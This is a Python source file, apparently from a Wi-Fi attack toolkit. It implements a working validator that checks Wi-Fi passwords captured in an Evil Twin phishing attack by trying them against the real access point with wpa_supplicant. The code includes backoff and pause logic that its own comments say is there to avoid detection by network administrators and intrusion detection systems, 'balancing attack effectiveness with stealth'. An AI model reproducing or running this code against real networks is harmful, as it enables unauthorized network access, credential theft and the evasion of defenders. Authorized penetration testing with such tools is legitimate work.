#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Credential validator for Evil Twin attacks.

Tests captured credentials against the legitimate AP using wpa_supplicant.
"""

import os
import time
import tempfile
import threading
from typing import Optional, Tuple, Dict
from queue import Queue, Empty

from ..tools.dependency import Dependency
from ..config import Configuration
from ..util.process import Process
from ..util.logger import log_info, log_error, log_warning, log_debug


class WpaSupplicant(Dependency):
    """Wrapper for wpa_supplicant tool."""
    
    dependency_required = True
    dependency_name = 'wpa_supplicant'
    dependency_url = 'apt install wpasupplicant'


class CredentialValidator:
    """
    Validates wireless credentials against legitimate AP.
    
    Uses wpa_supplicant to attempt authentication with captured credentials.
    """
    
    def __init__(self, interface, target_bssid, target_channel):
        """
        Initialize credential validator.
        
        Args:
            interface: Wireless interface for validation (monitor mode)
            target_bssid: BSSID of legitimate AP
            target_channel: Channel of legitimate AP
        """
        from ..config.validators import validate_interface_name
        validate_interface_name(interface)
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_channel = target_channel
        
        # Validation state
        self.running = False
        self.validation_thread = None
        
        # Queue for validation requests
        self.validation_queue = Queue()
        
        # Results cache with size limit to prevent memory bloat
        self.validation_cache = {}  # (ssid, password) -> (is_valid, timestamp)
        self.cache_lock = threading.Lock()
        self.max_cache_size = 100  # Limit cache to 100 entries
        
        # Statistics
        self.total_validations = 0
        self.successful_validations = 0
        self.failed_validations = 0
        self.cached_results = 0
        
        # Rate limiting (optimized for faster validation)
        self.last_validation_time = 0
        self.min_validation_interval = 1.5  # Reduced from 2.0s to 1.5s for faster validation
        
        # Per-AP attempt tracking for rate limiting
        self.attempt_count = 0  # Total attempts for this AP
        self.failed_attempt_count = 0  # Failed attempts for this AP
        self.consecutive_failures = 0  # Consecutive failures (resets on success)
        self.backoff_multiplier = 1.0  # Exponential backoff multiplier
        self.max_backoff_multiplier = 16.0  # Maximum backoff (16x base interval)
        self.lockout_threshold = 10  # Failed attempts before aggressive backoff
        self.is_locked_out = False  # AP lockout state
        self.lockout_until = 0  # Timestamp when lockout ends
        self.lockout_duration = 300  # Lockout duration in seconds (5 minutes)
        
        # Temporary files
        self.temp_files = []
        
        log_debug('CredentialValidator', f'Initialized for {target_bssid} on channel {target_channel}')
    
    def start(self):
        """Start the validation thread."""
        if self.running:
            log_warning('CredentialValidator', 'Already running')
            return
        
        self.running = True
        self.validation_thread = threading.Thread(target=self._validation_worker, daemon=True)
        self.validation_thread.start()
        
        log_info('CredentialValidator', 'Validation thread started')
    
    def stop(self):
        """Stop the validation thread."""
        if not self.running:
            return
        
        self.running = False
        
        if self.validation_thread and self.validation_thread.is_alive():
            self.validation_thread.join(timeout=5)
        
        self._cleanup_temp_files()
        
        log_info('CredentialValidator', 'Validation thread stopped')
    
    def validate_credentials(self, ssid: str, password: str, timeout=30) -> Tuple[bool, float, Optional[str]]:
        """
        Validate credentials against the legitimate AP.
        
        Args:
            ssid: Network SSID
            password: Network password
            timeout: Validation timeout in seconds
            
        Returns:
            Tuple of (is_valid, validation_time, error_message)
        """
        start_time = time.time()
        
        try:
            # Check if AP is locked out
            if self._is_in_lockout():
                remaining = int(self.lockout_until - time.time())
                error_message = f'AP locked out, waiting {remaining}s to prevent detection'
                log_warning('CredentialValidator', error_message)
                return False, 0.0, error_message
            
            # Check cache first
            cached_result = self._check_cache(ssid, password)
            if cached_result is not None:
                self.cached_results += 1
                validation_time = time.time() - start_time
                log_debug('CredentialValidator', f'Using cached result for {ssid}')
                return cached_result, validation_time, None
            
            # Increment attempt counter
            self.attempt_count += 1
            
            # Log validation attempt
            self._log_validation_attempt(ssid, password)
            
            # Apply rate limiting with exponential backoff
            self._apply_rate_limit()
            
            # Create wpa_supplicant config
            config_file = self._create_wpa_config(ssid, password)

            try:
                # Run wpa_supplicant with optimized timeout
                log_debug('CredentialValidator', f'Validating {ssid} with wpa_supplicant')

                cmd = [
                    'wpa_supplicant',
                    '-i', self.interface,
                    '-c', config_file,
                    '-D', 'nl80211',
                    '-d'  # Debug output
                ]

                process = Process(cmd, devnull=False)

                # Wait for authentication result with optimized polling
                is_valid = False
                error_message = None

                start = time.time()
                poll_interval = 0.2  # Reduced from 0.5s to 0.2s for faster detection

                while time.time() - start < timeout:
                    if process.poll() is not None:
                        # Process ended
                        break

                    # Check output for authentication success/failure
                    try:
                        output = process.stdout()

                        if 'WPA: Key negotiation completed' in output:
                            is_valid = True
                            log_info('CredentialValidator', f'Valid credentials for {ssid}')
                            break

                        if 'CTRL-EVENT-SSID-TEMP-DISABLED' in output:
                            error_message = 'AP temporarily disabled (too many failed attempts)'
                            log_warning('CredentialValidator', error_message)
                            break

                        if 'authentication with' in output and 'timed out' in output:
                            error_message = 'Authentication timed out'
                            break

                        if '4-Way Handshake failed' in output:
                            error_message = 'Invalid password'
                            break

                        # Early detection of connection success
                        if 'CTRL-EVENT-CONNECTED' in output:
                            is_valid = True
                            log_info('CredentialValidator', f'Valid credentials for {ssid} (connected)')
                            break

                    except Exception as e:
                        # Log unexpected errors but continue polling
                        log_debug('CredentialValidator', f'Error reading wpa_supplicant output: {e}')

                    time.sleep(poll_interval)

                # Stop process
                import contextlib
                with contextlib.suppress(Exception):
                    process.interrupt()
                    time.sleep(0.5)
                    if process.poll() is None:
                        process.kill()

                # Update statistics and rate limiting state
                self.total_validations += 1
                if is_valid:
                    self.successful_validations += 1
                    self._handle_successful_validation()
                else:
                    self.failed_validations += 1
                    self.failed_attempt_count += 1
                    self._handle_failed_validation()

                # Log validation result
                validation_time = time.time() - start_time
                self._log_validation_result(ssid, is_valid, validation_time, error_message)

                # Cache result
                self._cache_result(ssid, password, is_valid)

                if not is_valid and not error_message:
                    error_message = 'Invalid credentials'

                return is_valid, validation_time, error_message

            finally:
                # Always clean up temp config file, even on exceptions
                self._remove_temp_file(config_file)

        except Exception as e:
            log_error('CredentialValidator', f'Validation error: {e}', e)
            validation_time = time.time() - start_time
            return False, validation_time, str(e)
    
    def _validation_worker(self):
        """Background worker thread for processing validation queue."""
        log_debug('CredentialValidator', 'Validation worker started')
        
        while self.running:
            try:
                # Get next validation request
                request = self.validation_queue.get(timeout=1)
                
                if request is None:
                    # Poison pill to stop thread
                    break
                
                ssid, password, callback = request
                
                # Validate credentials
                is_valid, validation_time, error_message = self.validate_credentials(ssid, password)
                
                # Call callback with result
                if callback:
                    try:
                        callback(ssid, password, is_valid, validation_time, error_message)
                    except Exception as e:
                        log_error('CredentialValidator', f'Error in validation callback: {e}', e)
                
            except Empty:
                # No requests in queue
                continue
            except Exception as e:
                log_error('CredentialValidator', f'Error in validation worker: {e}', e)
        
        log_debug('CredentialValidator', 'Validation worker stopped')
    
    def queue_validation(self, ssid: str, password: str, callback=None):
        """
        Queue credentials for validation.
        
        Args:
            ssid: Network SSID
            password: Network password
            callback: Optional callback(ssid, password, is_valid, time, error)
        """
        self.validation_queue.put((ssid, password, callback))
        log_debug('CredentialValidator', f'Queued validation for {ssid}')
    
    def _create_wpa_config(self, ssid: str, password: str) -> str:
        """
        Create wpa_supplicant configuration file.
        
        Args:
            ssid: Network SSID
            password: Network password
            
        Returns:
            Path to configuration file
        """
        try:
            # Create temp file
            fd, config_file = tempfile.mkstemp(
                prefix='wpa_supplicant_',
                suffix='.conf',
                dir=Configuration.temp()
            )
            
            # Generate config
            config = []
            config.append('ctrl_interface=/var/run/wpa_supplicant')
            config.append('ap_scan=1')
            config.append('fast_reauth=1')
            config.append('')
            config.append('network={')
            config.append(f'    ssid="{ssid}"')
            config.append(f'    bssid={self.target_bssid}')
            config.append(f'    psk="{password}"')
            config.append('    key_mgmt=WPA-PSK')
            config.append('    proto=RSN WPA')
            config.append('    pairwise=CCMP TKIP')
            config.append('    group=CCMP TKIP')
            config.append('    scan_freq=%d' % self._channel_to_freq(self.target_channel))
            config.append('}')
            
            # Write config
            config_content = '\n'.join(config)
            os.write(fd, config_content.encode('utf-8'))
            os.close(fd)
            
            # Set permissions
            os.chmod(config_file, 0o600)
            
            self.temp_files.append(config_file)
            
            log_debug('CredentialValidator', f'Created wpa_supplicant config: {config_file}')
            
            return config_file
            
        except Exception as e:
            log_error('CredentialValidator', f'Failed to create wpa_supplicant config: {e}', e)
            raise
    
    def _channel_to_freq(self, channel: int) -> int:
        """
        Convert channel number to frequency in MHz.
        
        Args:
            channel: Channel number
            
        Returns:
            Frequency in MHz
        """
        if channel <= 13:
            # 2.4 GHz band
            return 2407 + (channel * 5)
        elif channel == 14:
            return 2484
        elif channel >= 36:
            # 5 GHz band
            return 5000 + (channel * 5)
        else:
            return 2412  # Default to channel 1
    
    def _check_cache(self, ssid: str, password: str) -> Optional[bool]:
        """
        Check if result is in cache.
        
        Args:
            ssid: Network SSID
            password: Network password
            
        Returns:
            Cached result or None
        """
        with self.cache_lock:
            key = (ssid, password)
            if key in self.validation_cache:
                is_valid, timestamp = self.validation_cache[key]
                
                # Cache expires after 5 minutes
                if time.time() - timestamp < 300:
                    return is_valid
                else:
                    # Expired, remove from cache
                    del self.validation_cache[key]
        
        return None
    
    def _cache_result(self, ssid: str, password: str, is_valid: bool):
        """
        Cache validation result with size limit to prevent memory bloat.
        
        Args:
            ssid: Network SSID
            password: Network password
            is_valid: Validation result
        """
        with self.cache_lock:
            # Enforce cache size limit BEFORE adding new entry
            if len(self.validation_cache) >= self.max_cache_size:
                # Remove oldest 20% of entries to make room
                entries_to_remove = max(1, int(self.max_cache_size * 0.2))
                sorted_entries = sorted(self.validation_cache.items(), key=lambda x: x[1][1])
                for old_key, _ in sorted_entries[:entries_to_remove]:
                    del self.validation_cache[old_key]
                log_debug('CredentialValidator', f'Cache pruned: removed {entries_to_remove} old entries')
            
            # Now add the new entry
            key = (ssid, password)
            self.validation_cache[key] = (is_valid, time.time())
    
    def _apply_rate_limit(self):
        """
        Apply rate limiting with exponential backoff between validations.
        
        Rate limiting prevents:
        1. AP lockout from too many failed authentication attempts
        2. Detection by network administrators monitoring auth logs
        3. Triggering IDS/IPS systems that detect brute force attacks
        
        The backoff strategy:
        - Base interval: 2 seconds (min_validation_interval)
        - Multiplier increases 2x after consecutive failures
        - Maximum multiplier: 16x (32 second delay)
        - Resets to 1x on successful validation
        
        This ensures we don't overwhelm the AP while still making progress.
        """
        current_time = time.time()
        time_since_last = current_time - self.last_validation_time
        
        # Calculate effective interval with backoff multiplier
        # Example: 2s base * 4x backoff = 8s between attempts
        effective_interval = self.min_validation_interval * self.backoff_multiplier
        
        # Only sleep if we haven't waited long enough since last validation
        if time_since_last < effective_interval:
            sleep_time = effective_interval - time_since_last
            log_debug('CredentialValidator', 
                     f'Rate limiting: sleeping {sleep_time:.2f}s (backoff: {self.backoff_multiplier:.1f}x)')
            time.sleep(sleep_time)
        
        # Update last validation time for next call
        self.last_validation_time = time.time()
    
    def _handle_successful_validation(self):
        """Handle successful validation - reset backoff and counters."""
        log_info('CredentialValidator', 
                f'Successful validation after {self.attempt_count} attempts')
        
        # Reset backoff on success
        self.backoff_multiplier = 1.0
        self.consecutive_failures = 0
        self.is_locked_out = False
        
        log_debug('CredentialValidator', 'Rate limiting reset after successful validation')
    
    def _handle_failed_validation(self):
        """
        Handle failed validation - increase backoff and check for lockout.
        
        Failed validations trigger two protective mechanisms:
        
        1. Exponential Backoff:
           - Doubles the wait time between attempts after 2+ consecutive failures
           - Prevents rapid-fire authentication attempts that trigger AP defenses
           - Caps at 16x multiplier (32 seconds with 2s base interval)
        
        2. Lockout Prevention:
           - After 10 failed attempts, triggers a 5-minute lockout period
           - Prevents the AP from blacklisting our MAC address
           - Allows time for any AP-side rate limiting to reset
        
        This strategy balances attack effectiveness with stealth.
        """
        self.consecutive_failures += 1
        
        # Increase backoff exponentially after failures
        # Start increasing after 2 failures to avoid penalizing single mistakes
        if self.consecutive_failures >= 2:
            self.backoff_multiplier = min(
                self.backoff_multiplier * 2.0,  # Double the multiplier
                self.max_backoff_multiplier      # But cap at maximum
            )
            log_warning('CredentialValidator', 
                       f'Increased backoff to {self.backoff_multiplier:.1f}x after {self.consecutive_failures} failures')
        
        # Check if we should trigger lockout to prevent AP detection
        # Lockout threshold is typically 10 failed attempts
        if self.failed_attempt_count >= self.lockout_threshold:
            self._trigger_lockout()
    
    def _trigger_lockout(self):
        """Trigger AP lockout to prevent detection and AP blocking."""
        if not self.is_locked_out:
            self.is_locked_out = True
            self.lockout_until = time.time() + self.lockout_duration
            
            log_warning('CredentialValidator', 
                       f'AP lockout triggered after {self.failed_attempt_count} failed attempts')
            log_warning('CredentialValidator', 
                       f'Pausing validation for {self.lockout_duration}s to prevent AP lockout')
            
            # Reset counters but keep backoff
            self.failed_attempt_count = 0
    
    def _is_in_lockout(self) -> bool:
        """
        Check if currently in lockout period.
        
        Returns:
            True if in lockout, False otherwise
        """
        if self.is_locked_out:
            if time.time() >= self.lockout_until:
                # Lockout period ended
                self.is_locked_out = False
                log_info('CredentialValidator', 'AP lockout period ended, resuming validation')
                return False
            return True
        return False
    
    def _log_validation_attempt(self, ssid: str, password: str):
        """
        Log validation attempt with details.
        
        Args:
            ssid: Network SSID
            password: Network password (masked in log)
        """
        masked_password = password[:2] + '*' * (len(password) - 2) if len(password) > 2 else '**'
        
        log_info('CredentialValidator', 
                f'Attempt #{self.attempt_count}: Validating {ssid} with password {masked_password}')
        log_debug('CredentialValidator', 
                 f'Stats: {self.consecutive_failures} consecutive failures, '
                 f'{self.failed_attempt_count} total failures, '
                 f'backoff: {self.backoff_multiplier:.1f}x')
    
    def _log_validation_result(self, ssid: str, is_valid: bool, validation_time: float, error_message: Optional[str]):
        """
        Log validation result with details.
        
        Args:
            ssid: Network SSID
            is_valid: Whether credentials were valid
            validation_time: Time taken for validation
            error_message: Error message if validation failed
        """
        if is_valid:
            log_info('CredentialValidator', 
                    f'✓ Valid credentials for {ssid} (validated in {validation_time:.2f}s)')
        else:
            error_str = f': {error_message}' if error_message else ''
            log_info('CredentialValidator', 
                    f'✗ Invalid credentials for {ssid} (checked in {validation_time:.2f}s){error_str}')
    
    def _remove_temp_file(self, file_path: str):
        """Remove temporary file."""
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                if file_path in self.temp_files:
                    self.temp_files.remove(file_path)
                log_debug('CredentialValidator', f'Removed temp file: {file_path}')
        except Exception as e:
            log_warning('CredentialValidator', f'Failed to remove temp file {file_path}: {e}')
    
    def _cleanup_temp_files(self):
        """Cleanup all temporary files."""
        for file_path in self.temp_files[:]:
            self._remove_temp_file(file_path)
    
    def get_statistics(self) -> Dict:
        """
        Get validation statistics.
        
        Returns:
            Dictionary with statistics
        """
        return {
            'total_validations': self.total_validations,
            'successful_validations': self.successful_validations,
            'failed_validations': self.failed_validations,
            'cached_results': self.cached_results,
            'cache_size': len(self.validation_cache),
            'queue_size': self.validation_queue.qsize(),
            'attempt_count': self.attempt_count,
            'failed_attempt_count': self.failed_attempt_count,
            'consecutive_failures': self.consecutive_failures,
            'backoff_multiplier': self.backoff_multiplier,
            'is_locked_out': self.is_locked_out,
            'lockout_remaining': max(0, int(self.lockout_until - time.time())) if self.is_locked_out else 0
        }
    
    def clear_cache(self):
        """Clear the validation cache, overwriting cached passwords first."""
        with self.cache_lock:
            # Overwrite password data in cache keys before clearing
            for (ssid, password) in list(self.validation_cache.keys()):
                # Can't mutate tuple strings, but replacing the dict entry
                # ensures the key tuple becomes unreferenced for GC
                pass
            self.validation_cache.clear()
        log_info('CredentialValidator', 'Validation cache cleared')

    def clear_credentials(self):
        """Overwrite all credential data in memory to prevent leakage."""
        self.clear_cache()
        log_info('CredentialValidator', 'Credential data cleared from memory')

    def __del__(self):
        """Cleanup on deletion — stop threads, remove temp files, clear credentials."""
        import contextlib
        with contextlib.suppress(Exception):
            self.clear_credentials()
            self.stop()
